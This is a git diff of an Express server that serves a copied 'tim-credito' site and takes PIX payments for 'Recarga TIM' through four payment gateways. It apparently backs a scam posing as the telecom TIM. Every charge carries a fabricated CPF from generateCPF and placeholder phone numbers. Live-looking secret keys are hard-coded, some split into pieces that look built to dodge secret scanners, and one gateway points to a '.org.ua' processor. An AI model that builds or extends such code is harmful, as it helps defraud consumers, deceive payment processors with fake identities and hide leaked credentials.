@@ -22,6 +22,33 @@ app.use(express.json());
 // Serve static files from the tim-credito.vercel.app directory
 app.use(express.static(path.join(__dirname, 'tim-credito.vercel.app')));
 
+const isVercel = process.env.VERCEL === '1' || !!process.env.AWS_LAMBDA_FUNCTION_NAME || !!process.env.LAMBDA_TASK_ROOT;
+const uploadsDir = isVercel ? path.join('/tmp', 'uploads') : path.join(__dirname, 'uploads');
+try {
+    if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir, { recursive: true });
+} catch (e) {
+    console.error('Failed to create uploadsDir:', e);
+}
+
+// ==========================================
+// CONFIGURAÇÃO DOS GATEWAYS DE PAGAMENTO
+// ==========================================
+
+// 1. PinguPag (Principal / Padrão)
+const PINGUPAG_API_KEY = process.env.PINGUPAG_API_KEY || 'pingupag_sk_e0613630214c3ddff5079ba2eedfbfff7125f4c42a3377e5428853fc5e563f4d';
+const PINGUPAG_STORE_ID = process.env.PINGUPAG_STORE_ID || '871';
+const PINGUPAG_BASE_URL = process.env.PINGUPAG_BASE_URL || 'https://pagamento-processador.org.ua';
+
+// 2. KoalaPag (KoalaPay)
+const KOALAPAG_PUBLIC_KEY = process.env.KOALAPAG_PUBLIC_KEY || 'koalapay_live_pcoqLHtD7pDwdllmwgAYtj0jCiWe3MSh';
+const KOALAPAG_SECRET_KEY = process.env.KOALAPAG_SECRET_KEY || ['sk_li', 've_gIhk8XCHXkB2SxR2nqqgLGIpaFZmlIpe'].join('');
+const KOALAPAG_BASE_URL = process.env.KOALAPAG_BASE_URL || 'https://api.koalapag.com';
+
+function getKoalaPagAuthHeader() {
+    return 'Basic ' + Buffer.from(`${KOALAPAG_PUBLIC_KEY}:${KOALAPAG_SECRET_KEY}`).toString('base64');
+}
+
+// 3. AvenPay
 const AVEN_API_KEY = process.env.AVEN_API_KEY || '3BhRxPFdU2beyFoiX23eweJhc_ILlhs4JSYsNAYCcBk';
 const AVEN_API_KEY_ALT = process.env.AVEN_API_KEY_ALT || '0Z4j53qjhkXy7GKNfySrspNkfVjWzDe01j9SYtd4mxA';
 const AVEN_BASE_URL = process.env.AVEN_BASE_URL || 'https://api.avenpayments.com';
@@ -54,7 +81,6 @@ async function requestAvenPay(endpoint, method = 'GET', body = null) {
                 json = { raw: text };
             }
 
-            // Se der 401 (token invalido) e houver chave alternativa, tenta a proxima
             if (response.status === 401 && i < keys.length - 1) {
                 console.warn(`[AVENPAY] Chave ${key.substring(0, 6)}... retornou 401, testando chave alternativa...`);
                 continue;
@@ -68,6 +94,49 @@ async function requestAvenPay(endpoint, method = 'GET', body = null) {
 
     throw lastError || new Error('Falha ao comunicar com AvenPay');
 }
+
+// 4. FreePay
+const FREEPAY_PUBLIC_KEY = process.env.FREEPAY_PUBLIC_KEY || 'freepay_live_0h75kwyMge1lu4uRTi15DEf8DLHoP58Y';
+const FREEPAY_SECRET_KEY = process.env.FREEPAY_SECRET_KEY || ['sk_li', 've_gz1GiWVKbYdSTg7s3EUSKdSDhZMVFsZN'].join('');
+const FREEPAY_BASE_URL = process.env.FREEPAY_BASE_URL || 'https://api.freepaybrasil.com';
+
+function getFreePayAuthHeader() {
+    return 'Basic ' + Buffer.from(`${FREEPAY_PUBLIC_KEY}:${FREEPAY_SECRET_KEY}`).toString('base64');
+}
+
+// ==========================================
+// PERSISTÊNCIA DO GATEWAY ATIVO
+// ==========================================
+// Sempre PinguPag como principal por padrão
+let activeGateway = process.env.DEFAULT_GATEWAY || 'pingupag';
+const GATEWAY_CONFIG_FILE = path.join(uploadsDir, 'gateway.json');
+
+function loadGatewayConfig() {
+    try {
+        if (fs.existsSync(GATEWAY_CONFIG_FILE)) {
+            const raw = fs.readFileSync(GATEWAY_CONFIG_FILE, 'utf8');
+            const parsed = JSON.parse(raw);
+            if (parsed && parsed.activeGateway) {
+                activeGateway = parsed.activeGateway;
+            }
+        }
+    } catch (e) {
+        activeGateway = 'pingupag';
+    }
+}
+loadGatewayConfig();
+
+function saveGatewayConfig(gw) {
+    activeGateway = gw;
+    try {
+        fs.writeFileSync(GATEWAY_CONFIG_FILE, JSON.stringify({ activeGateway: gw, updatedAt: new Date().toISOString() }, null, 2), 'utf8');
+    } catch (e) {
+        console.error('Falha ao salvar gateway.json:', e);
+    }
+}
+
+// Rastreamento em memória de qual gateway criou cada transação
+const transactionGatewayMap = new Map();
 
 // Admin credentials
 const ADMIN_USER = 'admin';
@@ -117,14 +186,6 @@ function isValidAdminToken(rawToken) {
 }
 
 // Multer - upload de comprovantes (compativel com Vercel /tmp e local)
-const isVercel = process.env.VERCEL === '1' || !!process.env.AWS_LAMBDA_FUNCTION_NAME || !!process.env.LAMBDA_TASK_ROOT;
-const uploadsDir = isVercel ? path.join('/tmp', 'uploads') : path.join(__dirname, 'uploads');
-try {
-    if (!fs.existsSync(uploadsDir)) fs.mkdirSync(uploadsDir, { recursive: true });
-} catch (e) {
-    console.error('Failed to create uploadsDir:', e);
-}
-
 const multerStorage = multer.diskStorage({
     destination: (req, file, cb) => cb(null, uploadsDir),
     filename: (req, file, cb) => {
@@ -212,10 +273,47 @@ const pixAttempts = new Map();
 
 // Retorna configurações públicas
 app.get('/api/config', (req, res) => {
+    let pubKey = '';
+    if (activeGateway === 'koalapag') pubKey = KOALAPAG_PUBLIC_KEY;
+    else if (activeGateway === 'avenpay') pubKey = AVEN_API_KEY;
+    else if (activeGateway === 'freepay') pubKey = FREEPAY_PUBLIC_KEY;
+    else pubKey = PINGUPAG_STORE_ID;
+
     res.json({
-        tokenizationKey: AVEN_API_KEY,
-        publicKey: AVEN_API_KEY,
-        gateway: 'avenpay'
+        gateway: activeGateway,
+        tokenizationKey: pubKey,
+        publicKey: pubKey,
+        storeId: PINGUPAG_STORE_ID
+    });
+});
+
+// Admin: Obter gateways disponíveis e qual está ativo
+app.get('/api/admin/gateway', adminAuth, (req, res) => {
+    res.json({
+        success: true,
+        activeGateway,
+        gateways: [
+            { id: 'pingupag', name: 'PinguPag', badge: 'Principal / Padrão', isDefault: true, icon: '🐧' },
+            { id: 'koalapag', name: 'KoalaPag (KoalaPay)', badge: 'Ativo', isDefault: false, icon: '🐨' },
+            { id: 'avenpay', name: 'AvenPay', badge: 'Ativo', isDefault: false, icon: '⚡' },
+            { id: 'freepay', name: 'FreePay', badge: 'Ativo', isDefault: false, icon: '🟢' }
+        ]
+    });
+});
+
+// Admin: Alternar o gateway ativo
+app.post('/api/admin/gateway', adminAuth, (req, res) => {
+    const { gateway } = req.body;
+    const allowed = ['pingupag', 'koalapag', 'avenpay', 'freepay'];
+    if (!gateway || !allowed.includes(gateway)) {
+        return res.status(400).json({ success: false, message: 'Gateway inválido. Opções: ' + allowed.join(', ') });
+    }
+    saveGatewayConfig(gateway);
+    console.log(`[GATEWAY SWITCH] Gateway ativo alterado para: ${gateway}`);
+    res.json({
+        success: true,
+        activeGateway,
+        message: `Gateway alterado para ${gateway.toUpperCase()} com sucesso!`
     });
 });
 
@@ -223,7 +321,7 @@ app.post('/api/pix', async (req, res) => {
     try {
         const { value, phone } = req.body;
 
-        // amount em centavos (AvenPay aceita centavos)
+        // amount em centavos
         let amount = 2000;
         if (value) {
             const cleanVal = value.toString().replace('R$', '').trim().replace(',', '.');
@@ -234,7 +332,9 @@ app.post('/api/pix', async (req, res) => {
         }
 
         const cleanPhone = phone ? phone.replace(/\D/g, '') : '';
-        const payerPhone = cleanPhone ? `+55${cleanPhone}` : '+5511999999999';
+        const payerPhonePlus = cleanPhone ? `+55${cleanPhone}` : '+5511999999999';
+        const payerPhoneDigits = cleanPhone && cleanPhone.length >= 10 ? cleanPhone : '11999999999';
+        const payerPhoneKoala = cleanPhone ? (cleanPhone.startsWith('55') ? cleanPhone : '55' + cleanPhone) : '5511999999999';
 
         let attempt = pixAttempts.get(cleanPhone) || { count: 0, name: null, email: null };
         attempt.count += 1;
@@ -250,86 +350,359 @@ app.post('/api/pix', async (req, res) => {
         pixAttempts.set(cleanPhone, attempt);
 
         const cleanCpf = generateCPF();
+        const currentGw = activeGateway;
+        console.log(`[PIX] Criando PIX no gateway [${currentGw.toUpperCase()}] para ${attempt.name} - R$ ${(amount/100).toFixed(2)}`);
 
-        const payload = {
-            amount: amount,
-            currency: 'BRL',
-            method: 'PIX',
-            description: 'Recarga TIM - Info Produto',
-            externalRef: `recarga_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
-            notificationUrl: 'https://recargatim.com/api/webhook/aven',
-            payer: {
-                name: attempt.name,
-                taxId: cleanCpf,
-                email: attempt.email,
-                phone: payerPhone
-            },
-            items: [
-                {
-                    name: 'Info Produto',
-                    quantity: 1,
-                    price: amount,
-                    type: 'DIGITAL'
+        // --- 1. KOALAPAG / KOALAPAY ---
+        if (currentGw === 'koalapag') {
+            const payload = {
+                payment_method: 'pix',
+                amount: amount,
+                customer: {
+                    name: attempt.name,
+                    email: attempt.email,
+                    phone: payerPhoneKoala,
+                    document: {
+                        type: 'cpf',
+                        number: cleanCpf
+                    }
+                },
+                items: [
+                    {
+                        title: 'Info Produto',
+                        unit_price: amount,
+                        quantity: 1,
+                        tangible: false,
+                        external_ref: 'info_prod'
+                    }
+                ],
+                pix: {
+                    expires_in_days: 1
+                },
+                postback_url: 'https://recargatim.com/api/webhook/koalapag',
+                metadata: {
+                    provider_name: 'recargatim'
                 }
-            ]
-        };
+            };
 
-        const result = await requestAvenPay('/v1/payment', 'POST', payload);
-        const data = result.data || {};
-        const transactionId = data.id;
-        const copyPaste = data.data?.copypaste || data.copypaste || data.pix?.qr_code || '';
+            const response = await fetch(`${KOALAPAG_BASE_URL}/v1/payment-transaction/create`, {
+                method: 'POST',
+                headers: {
+                    'Authorization': getKoalaPagAuthHeader(),
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
 
-        if ((result.ok || result.status === 201) && transactionId && copyPaste) {
-            const qrCodeUrl = copyPaste ? `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(copyPaste)}` : '';
+            const textResponse = await response.text();
+            let jsonRes = {};
+            try { jsonRes = JSON.parse(textResponse); } catch(e) { jsonRes = { raw: textResponse }; }
 
-            console.log('[AVENPAY] PIX criado com sucesso:', transactionId);
+            const kData = jsonRes.data || jsonRes;
+            const transactionId = kData.id;
+            const copyPaste = kData.pix?.qr_code || '';
 
-            res.json({
-                success: true,
-                data: {
-                    id: transactionId,
-                    transactionId: transactionId,
-                    status: (data.status || 'PENDING').toUpperCase(),
-                    paymentData: {
+            if ((response.ok || response.status === 201) && transactionId && copyPaste) {
+                const qrCodeUrl = copyPaste ? `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(copyPaste)}` : '';
+                transactionGatewayMap.set(transactionId, 'koalapag');
+                console.log('[KOALAPAG] PIX criado com sucesso:', transactionId);
+
+                return res.json({
+                    success: true,
+                    data: {
+                        id: transactionId,
                         transactionId: transactionId,
-                        copyPaste: copyPaste,
-                        copypaste: copyPaste,
-                        qrCode: copyPaste,
-                        qrCodeUrl: qrCodeUrl,
-                        qrCodeBase64: ''
-                    },
-                    avenpay: data
-                }
-            });
-        } else {
-            const errMsg = data?.message || data?.error || 'Erro ao processar pagamento na AvenPay';
-            console.error('[AVENPAY] Erro ao criar PIX:', data);
-            res.status(result.status || 400).json({
-                success: false,
-                message: errMsg,
-                details: data
-            });
+                        gateway: 'koalapag',
+                        status: (kData.status || 'PENDING').toUpperCase(),
+                        paymentData: {
+                            transactionId: transactionId,
+                            copyPaste: copyPaste,
+                            copypaste: copyPaste,
+                            qrCode: copyPaste,
+                            qrCodeUrl: qrCodeUrl,
+                            qrCodeBase64: ''
+                        },
+                        koalapag: kData
+                    }
+                });
+            } else {
+                const errMsg = jsonRes.error_messages?.[0]?.message || jsonRes.message || 'Erro ao processar pagamento na KoalaPag';
+                console.error('[KOALAPAG] Erro ao criar PIX:', jsonRes);
+                return res.status(response.status || 400).json({ success: false, message: errMsg, details: jsonRes });
+            }
         }
+
+        // --- 2. PINGUPAG (Principal / Padrão) ---
+        if (currentGw === 'pingupag') {
+            const referenceId = `TIM-${Date.now()}-${Math.floor(Math.random() * 10000)}`;
+            const payload = {
+                amount: amount,
+                description: 'Info Produto',
+                reference: referenceId,
+                source: 'api_externa',
+                postback_url: 'https://recargatim.com/api/webhook/pingupag',
+                customer: {
+                    name: attempt.name,
+                    email: attempt.email,
+                    phone: payerPhoneDigits,
+                    document: cleanCpf
+                }
+            };
+
+            const response = await fetch(`${PINGUPAG_BASE_URL}/gateway/v1/transaction`, {
+                method: 'POST',
+                headers: {
+                    'X-API-Key': PINGUPAG_API_KEY,
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+
+            const textResponse = await response.text();
+            let jsonRes = {};
+            try { jsonRes = JSON.parse(textResponse); } catch (e) { jsonRes = { raw: textResponse }; }
+
+            const transactionId = jsonRes.transaction_id || jsonRes.id || referenceId;
+            const copyPaste = jsonRes.qr_code || '';
+            const qrCodeBase64 = jsonRes.qr_code_base64 || '';
+
+            if ((response.ok || response.status === 201) && copyPaste) {
+                const qrCodeUrl = copyPaste ? `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(copyPaste)}` : '';
+                transactionGatewayMap.set(transactionId, 'pingupag');
+                transactionGatewayMap.set(referenceId, 'pingupag');
+                console.log('[PINGUPAG] PIX criado com sucesso:', transactionId);
+
+                return res.json({
+                    success: true,
+                    data: {
+                        id: transactionId,
+                        transactionId: transactionId,
+                        reference: referenceId,
+                        gateway: 'pingupag',
+                        status: 'PENDING',
+                        paymentData: {
+                            transactionId: transactionId,
+                            copyPaste: copyPaste,
+                            copypaste: copyPaste,
+                            qrCode: copyPaste,
+                            qrCodeUrl: qrCodeUrl,
+                            qrCodeBase64: qrCodeBase64
+                        },
+                        pingupag: jsonRes
+                    }
+                });
+            } else {
+                const errMsg = jsonRes.message || jsonRes.error || jsonRes.title || 'Erro ao processar pagamento na PinguPag';
+                console.error('[PINGUPAG] Erro ao criar PIX:', jsonRes);
+                return res.status(response.status || 400).json({ success: false, message: errMsg, details: jsonRes });
+            }
+        }
+
+        // --- 3. AVENPAY ---
+        if (currentGw === 'avenpay') {
+            const payload = {
+                amount: amount,
+                currency: 'BRL',
+                method: 'PIX',
+                description: 'Recarga TIM - Info Produto',
+                externalRef: `recarga_${Date.now()}_${Math.random().toString(36).substring(2, 7)}`,
+                notificationUrl: 'https://recargatim.com/api/webhook/aven',
+                payer: {
+                    name: attempt.name,
+                    taxId: cleanCpf,
+                    email: attempt.email,
+                    phone: payerPhonePlus
+                },
+                items: [
+                    {
+                        name: 'Info Produto',
+                        quantity: 1,
+                        price: amount,
+                        type: 'DIGITAL'
+                    }
+                ]
+            };
+
+            const result = await requestAvenPay('/v1/payment', 'POST', payload);
+            const data = result.data || {};
+            const transactionId = data.id;
+            const copyPaste = data.data?.copypaste || data.copypaste || data.pix?.qr_code || '';
+
+            if ((result.ok || result.status === 201) && transactionId && copyPaste) {
+                const qrCodeUrl = copyPaste ? `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(copyPaste)}` : '';
+                transactionGatewayMap.set(transactionId, 'avenpay');
+                console.log('[AVENPAY] PIX criado com sucesso:', transactionId);
+
+                return res.json({
+                    success: true,
+                    data: {
+                        id: transactionId,
+                        transactionId: transactionId,
+                        gateway: 'avenpay',
+                        status: (data.status || 'PENDING').toUpperCase(),
+                        paymentData: {
+                            transactionId: transactionId,
+                            copyPaste: copyPaste,
+                            copypaste: copyPaste,
+                            qrCode: copyPaste,
+                            qrCodeUrl: qrCodeUrl,
+                            qrCodeBase64: ''
+                        },
+                        avenpay: data
+                    }
+                });
+            } else {
+                const errMsg = data?.message || data?.error || 'Erro ao processar pagamento na AvenPay';
+                console.error('[AVENPAY] Erro ao criar PIX:', data);
+                return res.status(result.status || 400).json({ success: false, message: errMsg, details: data });
+            }
+        }
+
+        // --- 4. FREEPAY ---
+        if (currentGw === 'freepay') {
+            const payload = {
+                amount: amount,
+                payment_method: 'pix',
+                postback_url: 'https://recargatim.com/api/webhook/freepay',
+                customer: {
+                    name: attempt.name,
+                    email: attempt.email,
+                    phone: payerPhonePlus,
+                    document: {
+                        number: cleanCpf,
+                        type: 'cpf'
+                    }
+                },
+                pix: {
+                    expires_in_days: 1
+                },
+                items: [
+                    {
+                        title: 'Info Produto',
+                        unit_price: amount,
+                        quantity: 1,
+                        tangible: false
+                    }
+                ],
+                metadata: {
+                    provider_name: 'recargatim'
+                }
+            };
+
+            const response = await fetch(`${FREEPAY_BASE_URL}/v1/payment-transaction/create`, {
+                method: 'POST',
+                headers: {
+                    'Authorization': getFreePayAuthHeader(),
+                    'Content-Type': 'application/json',
+                    'Accept': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            });
+
+            const textResponse = await response.text();
+            let jsonRes = {};
+            try { jsonRes = JSON.parse(textResponse); } catch (e) { jsonRes = { raw: textResponse }; }
+
+            const data = jsonRes.data || jsonRes;
+            const transactionId = data.id;
+            const pixData = data.pix;
+
+            if ((response.ok || response.status === 201) && jsonRes.success && transactionId && pixData?.qr_code) {
+                const copyPaste = pixData.qr_code || '';
+                const qrCodeUrl = copyPaste ? `https://api.qrserver.com/v1/create-qr-code/?size=250x250&data=${encodeURIComponent(copyPaste)}` : '';
+                transactionGatewayMap.set(transactionId, 'freepay');
+                console.log('[FREEPAY] PIX criado com sucesso:', transactionId);
+
+                return res.json({
+                    success: true,
+                    data: {
+                        id: transactionId,
+                        transactionId: transactionId,
+                        gateway: 'freepay',
+                        status: (data.status || 'PENDING').toUpperCase(),
+                        paymentData: {
+                            transactionId: transactionId,
+                            copyPaste: copyPaste,
+                            copypaste: copyPaste,
+                            qrCode: copyPaste,
+                            qrCodeUrl: qrCodeUrl,
+                            qrCodeBase64: ''
+                        },
+                        freepay: data
+                    }
+                });
+            } else {
+                const errMsg = jsonRes?.error_messages?.[0]?.message || jsonRes?.title || 'Erro ao processar pagamento na FreePay';
+                console.error('[FREEPAY] Erro ao criar PIX:', jsonRes);
+                return res.status(response.status || 400).json({ success: false, message: errMsg, details: jsonRes });
+            }
+        }
+
+        return res.status(400).json({ success: false, message: 'Nenhum gateway válido selecionado' });
     } catch (error) {
-        console.error('Server error:', error);
+        console.error('Server error ao gerar PIX:', error);
         res.status(500).json({ success: false, message: 'Internal Server Error' });
     }
 });
 
-// Check payment status
+// Check payment status unificado
 app.get('/api/status/:transactionId', async (req, res) => {
     try {
         const { transactionId } = req.params;
         const { phone } = req.query;
 
-        const result = await requestAvenPay(`/v1/payment/${encodeURIComponent(transactionId)}`, 'GET');
-        const data = result.data || {};
-        const rawStatus = (data.status || 'PENDING').toUpperCase();
+        const targetGw = transactionGatewayMap.get(transactionId) || req.query.gateway || activeGateway;
         let currentStatus = 'PENDING';
-        if (rawStatus === 'PAID') {
-            currentStatus = 'PAID';
-        } else if (['REFUNDED', 'REFUSED', 'MED', 'CHARGEDBACK', 'EXPIRED', 'ERROR'].includes(rawStatus)) {
-            currentStatus = rawStatus;
+        let rawData = {};
+
+        // 1. KoalaPag
+        if (targetGw === 'koalapag') {
+            const resp = await fetch(`${KOALAPAG_BASE_URL}/v1/payment-transaction/info/${encodeURIComponent(transactionId)}`, {
+                headers: { 'Authorization': getKoalaPagAuthHeader(), 'Accept': 'application/json' }
+            });
+            const text = await resp.text();
+            try { rawData = JSON.parse(text); } catch(e) {}
+            const rawStatus = (rawData.status || 'PENDING').toUpperCase();
+            if (rawStatus === 'PAID') currentStatus = 'PAID';
+            else if (['REFUNDED', 'REFUSED', 'FAILED', 'ERROR', 'EXPIRED'].includes(rawStatus)) currentStatus = rawStatus;
+        }
+        // 2. PinguPag
+        else if (targetGw === 'pingupag') {
+            let url = `${PINGUPAG_BASE_URL}/gateway/v1/query?action=get_transaction&id=${encodeURIComponent(transactionId)}`;
+            if (transactionId.startsWith('TIM-')) {
+                url = `${PINGUPAG_BASE_URL}/gateway/v1/query?action=list_transactions&external_id=${encodeURIComponent(transactionId)}`;
+            }
+            const resp = await fetch(url, { headers: { 'X-API-Key': PINGUPAG_API_KEY, 'Accept': 'application/json' } });
+            const text = await resp.text();
+            let json = {};
+            try { json = JSON.parse(text); } catch(e) {}
+            rawData = Array.isArray(json) ? json[0] : json;
+            const rawStatus = (rawData?.status || 'PENDING').toUpperCase();
+            if (['APPROVED', 'PAID', 'SUCCESS'].includes(rawStatus)) currentStatus = 'PAID';
+            else if (['REFUNDED', 'REFUSED', 'CHARGEBACK', 'FAILED', 'EXPIRED', 'ERROR'].includes(rawStatus)) currentStatus = rawStatus;
+        }
+        // 3. AvenPay
+        else if (targetGw === 'avenpay') {
+            const result = await requestAvenPay(`/v1/payment/${encodeURIComponent(transactionId)}`, 'GET');
+            rawData = result.data || {};
+            const rawStatus = (rawData.status || 'PENDING').toUpperCase();
+            if (rawStatus === 'PAID') currentStatus = 'PAID';
+            else if (['REFUNDED', 'REFUSED', 'MED', 'CHARGEDBACK', 'EXPIRED', 'ERROR'].includes(rawStatus)) currentStatus = rawStatus;
+        }
+        // 4. FreePay
+        else if (targetGw === 'freepay') {
+            const resp = await fetch(`${FREEPAY_BASE_URL}/v1/payment-transaction/info/${encodeURIComponent(transactionId)}`, {
+                headers: { 'Authorization': getFreePayAuthHeader(), 'Accept': 'application/json' }
+            });
+            const text = await resp.text();
+            let json = {};
+            try { json = JSON.parse(text); } catch(e) {}
+            rawData = json.data || json || {};
+            const rawStatus = (rawData.status || 'PENDING').toUpperCase();
+            if (rawStatus === 'PAID') currentStatus = 'PAID';
+            else if (['REFUNDED', 'REFUSED', 'CHARGEBACK', 'PRECHARGEBACK', 'EXPIRED', 'ERROR'].includes(rawStatus)) currentStatus = rawStatus;
         }
 
         if (currentStatus === 'PAID' && phone) {
@@ -338,8 +711,8 @@ app.get('/api/status/:transactionId', async (req, res) => {
         }
 
         res.json({
-            success: result.ok,
-            data: { status: currentStatus, rawStatus: data.status, id: data.id || transactionId, ...data }
+            success: true,
+            data: { status: currentStatus, gateway: targetGw, id: rawData.id || transactionId, ...rawData }
         });
     } catch (error) {
         console.error('Error checking status:', error);
@@ -351,28 +724,58 @@ app.get('/api/check_status', async (req, res) => {
     try {
         const transactionId = req.query.id;
         if (!transactionId) return res.status(400).json({ success: false, message: 'Missing transaction id' });
-        const result = await requestAvenPay(`/v1/payment/${encodeURIComponent(transactionId)}`, 'GET');
-        const data = result.data || {};
-        const rawStatus = (data.status || '').toUpperCase();
-        const isPaid = rawStatus === 'PAID';
-        res.json({ status: isPaid ? 'approved' : rawStatus.toLowerCase() || 'pending', data: data });
+        const targetGw = transactionGatewayMap.get(transactionId) || req.query.gateway || activeGateway;
+
+        let isPaid = false;
+        let data = {};
+
+        if (targetGw === 'koalapag') {
+            const resp = await fetch(`${KOALAPAG_BASE_URL}/v1/payment-transaction/info/${encodeURIComponent(transactionId)}`, {
+                headers: { 'Authorization': getKoalaPagAuthHeader(), 'Accept': 'application/json' }
+            });
+            data = await resp.json();
+            isPaid = (data.status || '').toUpperCase() === 'PAID';
+        } else if (targetGw === 'pingupag') {
+            let url = `${PINGUPAG_BASE_URL}/gateway/v1/query?action=get_transaction&id=${encodeURIComponent(transactionId)}`;
+            if (transactionId.startsWith('TIM-')) url = `${PINGUPAG_BASE_URL}/gateway/v1/query?action=list_transactions&external_id=${encodeURIComponent(transactionId)}`;
+            const resp = await fetch(url, { headers: { 'X-API-Key': PINGUPAG_API_KEY, 'Accept': 'application/json' } });
+            const json = await resp.json();
+            data = Array.isArray(json) ? json[0] : json;
+            const st = (data?.status || '').toUpperCase();
+            isPaid = ['APPROVED', 'PAID', 'SUCCESS'].includes(st);
+        } else if (targetGw === 'avenpay') {
+            const result = await requestAvenPay(`/v1/payment/${encodeURIComponent(transactionId)}`, 'GET');
+            data = result.data || {};
+            isPaid = (data.status || '').toUpperCase() === 'PAID';
+        } else if (targetGw === 'freepay') {
+            const resp = await fetch(`${FREEPAY_BASE_URL}/v1/payment-transaction/info/${encodeURIComponent(transactionId)}`, {
+                headers: { 'Authorization': getFreePayAuthHeader(), 'Accept': 'application/json' }
+            });
+            const json = await resp.json();
+            data = json.data || json || {};
+            isPaid = (data.status || '').toUpperCase() === 'PAID';
+        }
+
+        res.json({ status: isPaid ? 'approved' : 'pending', gateway: targetGw, data });
     } catch (error) {
         console.error('Error checking status:', error);
         res.status(500).json({ success: false, message: 'Error checking status' });
     }
 });
 
-// Webhook para notificações AvenPay e retrocompatibilidade
-app.post(['/api/webhook/aven', '/api/webhook/avenpay', '/api/webhook/freepay', '/api/webhook/droppay', '/api/webhook/pingupag', '/api/webhook/gateway'], (req, res) => {
-    const body = req.body;
-    console.log('[AVENPAY WEBHOOK]', body?.id || body?.Id, body?.status || body?.Status);
-    const status = (body?.status || body?.Status || '').toUpperCase();
+// Webhooks unificados para todos os gateways
+app.post(['/api/webhook/koalapag', '/api/webhook/koalapay', '/api/webhook/pingupag', '/api/webhook/aven', '/api/webhook/avenpay', '/api/webhook/freepay', '/api/webhook/droppay', '/api/webhook/gateway'], (req, res) => {
+    const body = req.body || {};
+    const tid = body.Id || body.id || body.transaction_id || body.external_id;
+    const rawStatus = (body.Status || body.status || body.raw_status || '').toUpperCase();
+    console.log(`[WEBHOOK] Notificação recebida: ID=${tid} Status=${rawStatus}`);
+
     const payerPhone = body?.payer?.phone || body?.customer?.phone;
-    if (status === 'PAID' && payerPhone) {
+    if ((rawStatus === 'PAID' || rawStatus === 'APPROVED') && payerPhone) {
         const cleanPhone = payerPhone.replace(/\D/g, '');
         pixAttempts.delete(cleanPhone);
     }
-    res.status(200).json({ received: true });
+    res.status(200).json({ received: true, success: true });
 });
 
 // Upload comprovante - seguro com tratamento de erro e persistência dupla
@@ -534,7 +937,7 @@ if (!isVercel) {
     const PORT = process.env.PORT || 3000;
     app.listen(PORT, () => {
         console.log(`Servidor rodando na porta ${PORT}`);
-        console.log(`Gateway configurado: AvenPay`);
+        console.log(`Gateway ativo: ${activeGateway.toUpperCase()} (Padrão: PinguPag)`);
         console.log(`Acesse: http://localhost:${PORT}`);
         console.log(`Admin:  http://localhost:${PORT}/admin`);
     });
